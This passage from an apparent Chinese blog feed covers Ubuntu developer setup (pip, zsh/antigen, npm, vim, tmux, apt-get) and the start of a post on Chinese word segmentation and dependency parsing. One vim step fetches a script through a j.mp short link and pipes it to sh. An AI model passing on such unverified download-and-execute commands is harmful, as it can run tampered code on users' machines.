class="hljs-string">install </span><span class="hljs-string">python-minimal</span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo </span><span class="hljs-string">apt </span><span class="hljs-string">install </span><span class="hljs-string">python2.</span>7<br><br><span class="hljs-string">curl </span><span class="hljs-string">https:</span>//<span class="hljs-string">bootstrap.</span><span class="hljs-string">pypa.</span><span class="hljs-string">io/</span><span class="hljs-built_in">get-pip.py</span> -o <span class="hljs-built_in">get-pip.py</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">sudo</span> <span class="hljs-string">python3 </span><span class="hljs-built_in">get-pip.py</span> <span class="hljs-comment">#安装pip3</span><br><br><span class="hljs-string">sudo </span><span class="hljs-string">python2 </span><span class="hljs-built_in">get-pip.py</span> <span class="hljs-comment">#安装pip3</span><br><br><span class="hljs-string">sudo </span><span class="hljs-string">pip3 </span><span class="hljs-string">install </span><span class="hljs-built_in">--upgrade</span> <span class="hljs-string">pip </span><span class="hljs-comment">#升级pip3</span><br><br><span class="hljs-string">sudo </span><span class="hljs-string">pip2 </span><span class="hljs-string">install </span><span class="hljs-built_in">--upgrade</span> <span class="hljs-string">pip </span><span class="hljs-comment">#升级pip2</span><br><br><span class="hljs-comment"># 此时pip和python并不知道指向2还是3，需要自己修改。我们使用alias来设置别名</span><br><span class="hljs-string">vim </span>/<span class="hljs-string">etc/</span><span class="hljs-string">profile </span> <span class="hljs-comment"># 所有用户 。修改~/.bashrc或者.profile只会修改当前用户</span><br><span class="hljs-comment"># 写入</span><br><span class="hljs-string">alias </span><span class="hljs-string">pip=</span>/<span class="hljs-string">usr/</span><span class="hljs-string">local/</span><span class="hljs-string">bin/</span><span class="hljs-string">pip3.</span>6<br><span class="hljs-string">alias </span><span class="hljs-string">python=</span>/<span class="hljs-string">usr/</span><span class="hljs-string">bin/</span><span class="hljs-string">python3.</span>6<br><br><span class="hljs-string">source </span>/<span class="hljs-string">etc/</span><span class="hljs-string">profile</span><br></code></pre></div></td></tr></table></figure><h3><span id="vs-code">VS Code</span></h3><p><a href="https://code.visualstudio.com/download">微软官网</a>下载<code>deb</code>安装即可</p><h3><span id="git">Git</span></h3><figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> git<br></code></pre></div></td></tr></table></figure><h3><span id="有道词典">有道词典</span></h3><p><a href="https://cidian.youdao.com/multi.html#linuxAll">官网</a>下载安装即可</p><h3><span id="typora">typora</span></h3><p>官网打包的二进制 Typora 在 Ubuntu (gnome)上安装为应用程序（可被选择为默认程序）</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> Downloads/Software</span><br><span class="hljs-meta">$</span><span class="bash"> wget https://typora.io/linux/Typora-linux-x64.tar.gz</span><br><span class="hljs-meta">$</span><span class="bash"> tar -xzvf Typora-linux-x64.tar.gz</span><br><span class="hljs-meta">$</span><br><span class="hljs-meta">$</span><span class="bash"> sudo mv Typora-linux-x64 /opt/</span><br><span class="hljs-meta">$</span><span class="bash"> </span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /opt/Typora-linux-x64/</span><br><span class="hljs-meta">$</span><span class="bash"> ./Typora  <span class="hljs-comment"># test could run ?</span></span><br><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /usr/share/applications/Typora.desktop</span><br><span class="hljs-meta">$</span><span class="bash"> sudo vim Typora.desktop</span><br><br>[Desktop Entry]<br>Name=Typora<br>GenericName=Editor<br>Comment=Typroa - a markdown editor<br>Exec="/opt/Typora-linux-x64/Typora" %U<br>Icon=/opt/Typora-linux-x64/resources/app/asserts/icon/icon_256x256.png<br>Terminal=false<br>Categories=Markdown;<br>StartupNotify=false<br>Type=Application<br></code></pre></div></td></tr></table></figure><h3><span id="sublime-text">sublime-text</span></h3><p>https://www.sublimetext.com/docs/3/linux_repositories.html#apt</p><h3><span id="jetbrains">jetbrains</span></h3><p>https://www.jetbrains.com/toolbox-app/</p><h3><span id="terminator">Terminator</span></h3><p>新的shell界面</p><ul><li>常用快捷键</li></ul><table><thead><tr class="header"><th style="text-align: left;">快捷键</th><th style="text-align: left;">作用</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">Ctrl+Shift+E</td><td style="text-align: left;">垂直分割窗口</td></tr><tr class="even"><td style="text-align: left;">Ctrl+Shift+O</td><td style="text-align: left;">水平分割窗口</td></tr><tr class="odd"><td style="text-align: left;">Ctrl+Shift+W</td><td style="text-align: left;">关闭当前窗格</td></tr><tr class="even"><td style="text-align: left;">Ctrl+Shift+C</td><td style="text-align: left;">复制</td></tr><tr class="odd"><td style="text-align: left;">Ctrl+Shift+V</td><td style="text-align: left;">粘贴</td></tr><tr class="even"><td style="text-align: left;">Ctrl+Shift+X</td><td style="text-align: left;">放大或缩小某一窗口</td></tr><tr class="odd"><td style="text-align: left;">Ctrl+Shift+Z</td><td style="text-align: left;">从放大窗口回到多窗格界面</td></tr><tr class="even"><td style="text-align: left;">ALT+↑[↓,←,→]</td><td style="text-align: left;">移动到上[下、左、右]面一个窗口</td></tr><tr class="odd"><td style="text-align: left;">Ctrl+Tab</td><td style="text-align: left;">切换窗口</td></tr><tr class="even"><td style="text-align: left;">Ctrl+<code>-</code></td><td style="text-align: left;">缩小字体</td></tr><tr class="odd"><td style="text-align: left;">Ctrl+Shift+<code>=</code>也就是Ctrl+<code>+</code></td><td style="text-align: left;">放大字体</td></tr></tbody></table><h3><span id="zsh-fish">Zsh fish</span></h3><p>使用<code>oh-my-zsh</code>来自动管理配置，可以查看官网：<a href="https://link.zhihu.com/?target=https%3A//ohmyz.sh/">https://ohmyz.sh/</a></p><p>zsh官方的<code>antigen</code>来管理https://github.com/zsh-users/antigen</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">sudo</span> <span class="hljs-string">apt install zsh</span><br><span class="hljs-comment"># 切换到zsh</span><br><span class="hljs-attr">chsh</span> <span class="hljs-string">-s /bin/zsh </span><br><br><span class="hljs-attr">curl</span> <span class="hljs-string">-L git.io/antigen &gt; antigen.zsh  # 或者直接在git.io/antigen下载文本</span><br><span class="hljs-comment"># or use git.io/antigen-nightly for the latest version</span><br><span class="hljs-comment"># or apt-get install zsh-antigen</span><br></code></pre></div></td></tr></table></figure><p>在 <code>~/.zshrc</code> 中添加下面的内容</p><figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">source</span> <span class="hljs-string">~/antigen.zsh</span><br><br><span class="hljs-comment"># Load the oh-my-zsh's library.</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">use oh-my-zsh</span><br><br><span class="hljs-comment"># Bundles from the default repo (robbyrussell's oh-my-zsh).</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle brew</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle command-not-found</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle docker</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle docker-compose</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle gem</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle git</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle golang</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle ng</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle osx</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle pip</span><br><br><span class="hljs-comment"># Syntax highlighting bundle.</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle zsh-users/zsh-syntax-highlighting</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle zsh-users/zsh-completions</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle zsh-users/zsh-autosuggestions</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">bundle zsh-users/zsh-apple-touchbar</span><br><br><span class="hljs-comment"># Load the theme.</span><br><span class="hljs-comment"># antigen theme robbyrussell</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">theme https://github.com/denysdovhan/spaceship-prompt spaceship</span><br><br><span class="hljs-comment"># Tell Antigen that you're done.</span><br><span class="hljs-attr">antigen</span> <span class="hljs-string">apply</span><br></code></pre></div></td></tr></table></figure><p>进入zsh</p><p>乱码问题</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://github.com/powerline/fonts.git<br><span class="hljs-comment"># install</span><br>cd fonts<br>./install.sh<br></code></pre></div></td></tr></table></figure><p>在优化中设置等宽字体为powerline类型字体中的一个</p><p>其他选择：fish</p><p>https://link.zhihu.com/?target=https%3A//wiki.archlinux.org/index.php/Fish</p><h3><span id="tldr">TLDR</span></h3><p>https://tldr.sh/：常用命令范式查找工具</p><h3><span id="文件查找">文件查找</span></h3><p>find</p><p>locate</p><p><a href="https://github.com/sharkdp/fd" target="_blank" rel="noopener">fd</a>：<em>fd</em> is asimple, fast and user-friendly alternative to <a href="https://www.gnu.org/software/findutils/"><em>find</em></a>.</p><h3><span id="代码查找">代码查找</span></h3><blockquote><p>重要的是：有些问题使用合适的工具就会迎刃而解，而具体选择哪个工具则不是那么重要</p></blockquote><p>grep</p><p><a href="https://beyondgrep.com/" target="_blank" rel="noopener">ack</a>, <a href="https://github.com/ggreer/the_silver_searcher">ag</a> 和 <a href="https://github.com/BurntSushi/ripgrep">rg</a></p><h3><span id="查找shell历史">查找Shell历史</span></h3><p><code>Ctrl+R</code> 对命令历史记录进行回溯搜索</p><h3><span id="文件夹导航">文件夹导航</span></h3><p><a href="https://github.com/clvv/fasd">fasd</a>：查找最常用和/或最近使用的文件和目录</p><p>概览目录结构，例如 <a href="https://linux.die.net/man/1/tree"><code>tree</code></a>, <a href="https://github.com/Canop/broot"><code>broot</code></a></p><p>更完整的文件管理器，例如 <a href="https://github.com/jarun/nnn"><code>nnn</code></a> 或 <a href="https://github.com/ranger/ranger"><code>ranger</code></a></p><h3><span id="npm">npm</span></h3><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">sudo  apt-<span class="hljs-built_in">get</span> install nodejs<br><br>sudo  apt-<span class="hljs-built_in">get</span> install npm<br><br>npm -v<br><br>npm <span class="hljs-built_in">config</span> <span class="hljs-built_in">set</span> registry https:<span class="hljs-comment">//registry.npm.taobao.org</span><br></code></pre></div></td></tr></table></figure><p>安装nrm工具，用于管理软件源。</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo npm install -g nrm<br><br><span class="hljs-variable">$ </span>nrm ls<br></code></pre></div></td></tr></table></figure><p>在特定网络环境下需要配置代理的话，可以使用如下命令配置。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">$  npm <span class="hljs-built_in">config</span> <span class="hljs-built_in">set</span> proxy http:<span class="hljs-comment">//127.0.0.1:3128</span><br>$ npm <span class="hljs-built_in">config</span> <span class="hljs-built_in">set</span> http-proxy http:<span class="hljs-comment">//127.0.0.1:3128</span><br>$ npm <span class="hljs-built_in">config</span> <span class="hljs-built_in">set</span> https-proxy https:<span class="hljs-comment">//127.0.0.1:3128</span><br></code></pre></div></td></tr></table></figure><h3><span id="vim">vim</span></h3><p><strong>安装VIM</strong></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> install vim<br></code></pre></div></td></tr></table></figure><p>https://spacevim.org/documentation/：spacevim插件集合</p><p>or</p><p>https://github.com/spf13/spf13-vim：一键配置插件集合</p><p>http://vim.spf13.com/#install</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">curl http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">j</span>.mp/spf13-vim3 -L &gt; spf13-<span class="hljs-keyword">vim</span>.<span class="hljs-keyword">sh</span> &amp;&amp; <span class="hljs-keyword">sh</span> spf13-<span class="hljs-keyword">vim</span>.<span class="hljs-keyword">sh</span><br></code></pre></div></td></tr></table></figure><h4><span id="-tmux">- tmux</span></h4><p>Ubuntu并不自带tmux，所以我们需要输入以下指令进行安装：</p><p>按下 Ctrl + d 或者直接在命令行输入 exit指令，就可以退出Tmux窗口。</p><p>Tmux窗口有很多的快捷键，所有的快捷键都需要前缀键。默认的前缀键是 Ctrl+ b，只有先按下 Ctrl + b，快捷键才能生效。举例来说，帮助指令的快捷键是Ctrl + b ?。那么在Tmux窗口下，先按下 Ctrl + b，再按下?，就能显示帮助信息。</p><p>tmux重要指令的总结：</p><table><colgroup><col style="width: 67%"><col style="width: 32%"></colgroup><thead><tr class="header"><th>tmux new -s <session_name></session_name></th><th>新建一个特定名称的会话</th></tr></thead><tbody><tr class="odd"><td>tmux detach</td><td>将当前会话与窗口分离</td></tr><tr class="even"><td>tmux ls / tmux list-session</td><td>查看当前所有的Tmux会话</td></tr><tr class="odd"><td>tmux attach -t <session_name></session_name></td><td>重新连接某个已存在的会话</td></tr><tr class="even"><td>tmux kill-session -t <session_name></session_name></td><td>删除某个会话</td></tr><tr class="odd"><td>tmux switch -t <session-name></session-name></td><td>切换会话</td></tr><tr class="even"><td>tmux rename-session -t <old_session> <new_session></new_session></old_session></td><td>重新命名会话</td></tr></tbody></table><p>会话相关的快捷键：</p><table><thead><tr class="header"><th>Ctrl + b d</th><th>分离会话</th></tr></thead><tbody><tr class="odd"><td>Ctrl + b s</td><td>列出所有会话</td></tr><tr class="even"><td>Ctrl + b $</td><td>重命名当前会话</td></tr></tbody></table><p>Tmux可以在一个窗口中分出多个窗格(pane)，每个窗格可以运行不同的指令。以下是相关快捷键：</p><p>Ctrl+b % 划分左右两个窗格 Ctrl+b “ 划分上下两个窗格 Ctrl+b<arrow key> 切换到其他窗格，<arrow key>指向切换的方向 Ctrl+b ;切换到上一个窗格 Ctrl+b o 切换到下一个窗格 Ctrl+b { 当前窗格左移 Ctrl+b} 当前窗格右移 Ctrl+b x 关闭当前窗格</arrow></arrow></p><h4><span id="-代码折叠">- 代码折叠</span></h4><table><thead><tr class="header"><th><code>zc</code></th><th>关闭当前打开的折叠</th></tr></thead><tbody><tr class="odd"><td><code>zo</code></td><td>打开当前的折叠</td></tr><tr class="even"><td><code>zm</code></td><td>关闭所有折叠</td></tr><tr class="odd"><td><code>zM</code></td><td>关闭所有折叠及其嵌套的折叠</td></tr><tr class="even"><td><code>zr</code></td><td>打开所有折叠</td></tr><tr class="odd"><td><code>zR</code></td><td>打开所有折叠及其嵌套的折叠</td></tr><tr class="even"><td><code>zd</code></td><td>删除当前折叠</td></tr><tr class="odd"><td><code>zE</code></td><td>删除所有折叠</td></tr><tr class="even"><td><code>zj</code></td><td>移动至下一个折叠</td></tr><tr class="odd"><td><code>zk</code></td><td>移动至上一个折叠</td></tr><tr class="even"><td><code>zn</code></td><td>禁用折叠</td></tr><tr class="odd"><td><code>zN</code></td><td>启用折叠</td></tr></tbody></table><h3><span id="simplescreenrecorder">SimpleScreenRecorder</span></h3><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install simplescreenrecorder<br></code></pre></div></td></tr></table></figure><h3><span id="you-get"></span></h3><p>Dumb downloader that scrapes the web</p><h3><span id="tget-tget-is-wget-fortorrents">: tget is wget fortorrents</span></h3><h3><span id="unity-tweak-工具">Unity Tweak 工具</span></h3><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install unity-tweak-tool<br></code></pre></div></td></tr></table></figure><h3><span id="使用-parcellite剪切板">使用 parcellite剪切板</span></h3><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>sudo apt-get install parcellite<br><span class="hljs-variable">$ </span>parcellite<br></code></pre></div></td></tr></table></figure><h3><span id="设置登录背景">设置登录背景</span></h3><p><strong>假设我现在用的图片是mypicture.jpg ,将它移动到/usr/share/backgrounds/目录下</strong></p><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">sudo mv currentdir&#x2F;mypicture.jpg  &#x2F;usr&#x2F;share&#x2F;backgrounds&#x2F;<br></code></pre></div></td></tr></table></figure><p>Ubuntu现在用的Gnome的桌面，和以前Unity时候的配置文件不一样，所以16.04的教程是用不了的，18.04登录背景相关的配置是用css的：/etc/alternatives/gdm3.css</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo gedit <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-regexp">/gdm3.css</span><br></code></pre></div></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">#找到默认的这个部分<br><span class="hljs-selector-id">#lockDialogGroup</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#2c001e</span> <span class="hljs-built_in">url</span>(resource:///org/gnome/shell/theme/noise-texture.png);<br>  <span class="hljs-attribute">background-repeat</span>: repeat; <br>&#125;<br>#改为<br><span class="hljs-selector-id">#lockDialogGroup</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#2c001e</span> <span class="hljs-built_in">url</span>(file:///usr/share/backgrounds/mypicture.jpg);         <br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-size</span>: cover;<br>  <span class="hljs-attribute">background-position</span>: center; <br>&#125;<br></code></pre></div></td></tr></table></figure><p>保存并重启.</p><h3><span id="apt-get使用">apt-get使用</span></h3><p>apt-get命令本身并不具有管理软件包功能，只是提供了一个软件包管理的命令行平台。</p><p>apt-get命令的一般语法格式为： apt-get subcommands [ -d | -f | -m | -q| --purge | --reinstall | - b | - s | - y | - u | - h | -v ] [pkg]<br>apt-cache提供了搜索功能。</p><ol type="1"><li><p>更新或升级操作： apt-get update # 更新源<br>apt-get upgrade # 更新所有已安装的包<br>apt-get dist-upgrade # 发行版升级（如，从10.10到11.04）</p></li><li><p>安装或重装类操作： apt-get install <pkg> #安装软件包<pkg>，多个软件包用空格隔开<br>apt-get install --reinstall <pkg> # 重新安装软件包<pkg><br>apt-get install -f <pkg> # 修复安装（破损的依赖关系）软件包<pkg></pkg></pkg></pkg></pkg></pkg></pkg></p><ol start="3" type="1"><li>卸载类操作： apt-get remove <pkg> #删除软件包<pkg>（不包括配置文件）<br>apt-get purge <pkg> # 删除软件包<pkg>（包括配置文件）</pkg></pkg></pkg></pkg></li></ol></li><li><p>下载清除类操作： apt-get source <pkg> #下载pkg包的源代码到当前目录<br>apt-get download <pkg> # 下载pkg包的二进制包到当前目录<br>apt-get source -d <pkg> # 下载完源码包后，编译<br>apt-get build-dep <pkg> # 构建pkg源码包的依赖环境（编译环境？）<br>apt-get clean #清除缓存(/var/cache/apt/archives/{,partial}下)中所有已下载的包<br>apt-get autoclean #类似于clean，但清除的是缓存中过期的包（即已不能下载或者是无用的包）<br>apt-get autoremove #删除因安装软件自动安装的依赖，而现在不需要的依赖包</pkg></pkg></pkg></pkg></p></li><li><p>查询类操作： apt-cache stats # 显示系统软件包的统计信息<br>apt-cache search <pkg> # 使用关键字pkg搜索软件包<br>apt-cache show <pkg_name> # 显示软件包pkg_name的详细信息<br>apt-cache depends <pkg> # 查看pkg所依赖的软件包<br>apt-cache rdepends <pkg> # 查看pkg被那些软件包所依赖</pkg></pkg></pkg_name></pkg></p></li><li><p>关于软件安装目录的说明：</p></li></ol><p>一般的deb包(包括新立得或者apt-get下载的)都在/usr/share。</p><p>自己下载的压缩包或者编译的包，有些可以选择安装目录，一般放在/usr/local/，也有在/opt的。</p><ol start="7" type="1"><li>关于apt-get的缓存目录：</li></ol><p>默认的缓存目录是/var/cache/apt/archives/</p><p>为日后重装系统后安装软件节省下载时间或者将软件包给别人用</p><hr><p>参考链接：</p><p><a href="https://ywnz.com/linuxjc/1727.html">Ubuntu18.04安装后应该做的事</a></p><p><a href="https://zhuanlan.zhihu.com/p/56253982">Linux玩家必备：Ubuntu完全配置指南</a></p><p><a href="https://blog.csdn.net/ice__snow/article/details/80152068">Ubuntu18.04配置及美化</a></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中文文本处理</title>
      <link href="/posts/b75580e5.html"/>
      <url>/posts/b75580e5.html</url>
      
        <content type="html"><![CDATA[<h1><span id="中文文本基本任务与处理">中文文本基本任务与处理</span></h1><h2><span id="1分词">1.分词</span></h2><p>中文和日文单纯从文本形态上无法区分具备独立含义的词（拉丁语系纯天然由空格分隔不同的word）。因此在很多中文任务中，我们需要做的第一个处理叫做<strong>分词</strong>。</p><ul><li>​主流的分词方法主要是<strong>基于词典匹配的分词方法(正向最大匹配法、逆向最大匹配法和双向匹配分词法等)</strong>和<strong>基于统计的分词方法(HMM、CRF、和深度学习)</strong>；‘</li><li>​ 主流的分词工具库包括中科院计算所NLPIR、哈工大LTP、清华大学THULAC、Hanlp分词器、Pythonjieba工具库等。</li></ul><h3><span id="最大匹配法">最大匹配法</span></h3><p>​最大匹配是指以词典为依据，取词典中最长单词为第一个次取字数量的扫描串，在词典中进行扫描（为提升扫描效率，还可以跟据字数多少设计多个字典，然后根据字数分别从不同字典中进行扫描）。</p><p>​双向最大匹配法：正向最大匹配和逆向最大匹配两种算法都切一遍，然后根据大颗粒度词越多越好，非词典词和单字词越少越好的原则，选取其中一种分词结果输出。</p><blockquote><p>“我们在野生动物园玩”</p><p>​ -正向最大匹配法：“我们/在野/生动/物/园/玩”，其中，单字字典词为2，非词典词为1。</p><p>​ -逆向最大匹配法：“我们/在/野生动物园/玩”，其中，单字字典词为2，非词典词为0。</p><blockquote><p>​ 非字典词：正向(1)&gt;逆向(0)（越少越好） ​单字字典词：正向(2)=逆向(2)（越少越好） ​总词数：正向(6)&gt;逆向(4)（越少越好）</p></blockquote><p>因此最终输出为逆向结果。</p></blockquote><h2><span id="2去停用词与n-gram">2.去停用词与N-gram</span></h2><p>​ 同英文</p><h2><span id="3词性标注">3.词性标注</span></h2><p>​ 词性标注（part-of-speechtagging）,又称为词类标注或者简称标注，是指为分词结果中的每个单词标注一个正确的词性。</p><p>​在汉语中，词性标注比较简单，因为汉语词汇词性多变的情况比较少见，大多词语只有一个词性，或者出现频次最高的词性远远高于第二位的词性。</p><h2><span id="4句法依存分析">4.句法依存分析</span></h2><p>​ 依存句法分析(Dependency Parsing, DP)识别句子中的“主谓宾”、“定状补”这些语法成分，并分析各成分之间的关系。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/3-中文文本处理.assets/image-20200229212113564.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​ 依存句法分析标注关系(共14种) 及含义如下(哈工大开源包使用)：</p><table><colgroup><col style="width: 15%"><col style="width: 6%"><col style="width: 39%"><col style="width: 38%"></colgroup><thead><tr class="header"><th style="text-align: left;">关系类型</th><th style="text-align: center;">Tag</th><th style="text-align: center;">Description</th><th style="text-align: center;">Example</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">主谓关系</td><td style="text-align: center;">SBV</td><td style="text-align: center;">subject-verb</td><td style="text-align: center;">我送她一束花(我&lt;–送)</td></tr><tr class="even"><td style="text-align: left;">动宾关系</td><td style="text-align: center;">VOB</td><td style="text-align: center;">直接宾语，verb-object</td><td style="text-align: center;">我送她一束花(送–&gt; 花)</td></tr><tr class="odd"><td style="text-align: left;">间宾关系</td><td style="text-align: center;">IOB</td><td style="text-align: center;">间接宾语，indirect-object</td><td style="text-align: center;">我送她一束花(送–&gt; 她)</td></tr><tr class="even"><td style="text-align: left;">前置宾语</td><td style="text-align: center;">FOB</td><td style="text-align: center;">前置宾语，fronting-object</td><td style="text-align: center;">他什么书都读(书&lt;–读)</td></tr><tr class="odd"><td style="text-align: left;">兼语</td><td style="text-align: center;">DBL</td><td style="text-align: center;">double</td><td style="text-align: center;">他请我吃饭(请–&gt; 我)</td></tr><tr class="even"><td style="text-align: left;">定中关系</td><td style="text-align: center;">ATT</td><td style="text-align: center;">attribute</td><td style="text-align: center;">红苹果(红&lt;–苹果)</td></tr><tr class="odd"><td style="text-align: left;">状中结构</td><td style="text-align: center;">ADV</td><td style="text-align: center;">adverbial</td><td style="text-align: center;">非常美丽(非常&lt;–美丽)</td></tr><tr class="even"><td style="text-align: left;">动补结构</td><td style="text-align: center;">CMP</td><td style="text-align: center;">complement</td><td style="text-align: center;">做完了作业(做–&gt; 完)</td></tr><tr class="odd"><td style="text-align: left;">并列关系</td><td style="text-align: center;">COO</td><td style="text-align: center;">coordinate</td><td style="text-align: center;">大山和大海(大山–&gt; 大海)</td></tr><tr class="even"><td style="text-align: left;">介宾关系</td><td style="text-align: center;">POB</td><td style="text-align: center;">preposition-object</td><td style="text-align: center;">在贸易区内(在–&gt; 内)</td></tr><tr class="odd"><td style="text-align: left;">左附加关系</td><td style="text-align: center;">LAD</td><td style="text-align: center;">left adjunct</td><td style="text-align: center;">大山和大海(和&lt;–大海)</td></tr><tr class="even"><td style="text-align: left;">右附加关系</td><td style="text-align: center;">RAD</td><td style="text-align: center;">right adjunct</td><td style="text-align: center;">孩子们(孩子–&gt; 们)</td></tr><tr class="odd"><td style="text-align: left;">独立结构</td><td style="text-align: center;">IS</td><td style="text-align: center;">independent structure</td><td style="text-align: center;">两个单句在结构上彼此独立</td></tr><tr class="even"><td style="text-align: left;">核心关系</td><td style="text-align: center;">HED</td><td style="text-align: center;">head</td><td style="text-align: center;">指整个句子的核心</td></tr></tbody></table><h2><span id="5语义依存分析">5.语义依存分析</span></h2><p>​ Semantic Dependency 